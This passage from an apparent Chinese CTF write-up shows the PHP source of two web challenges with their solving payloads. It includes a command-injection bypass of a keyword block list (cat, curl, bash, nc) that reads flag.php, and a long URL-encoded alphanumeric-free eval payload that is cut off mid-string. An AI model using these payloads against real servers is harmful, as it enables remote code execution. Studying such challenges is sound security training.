    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//level 1</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"没有这样的数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//level 2</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//get flag</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'非预期修复*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>这题和上题差不多，只是最后的命令多过滤了一些，直接给出payload：</p>
<pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre>

<h3 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h3><p>源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'l'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'v'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'z'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blacklisted</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$code</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>直接给出P神的payload(无字母数字的RCE)：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
<p>GET：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span 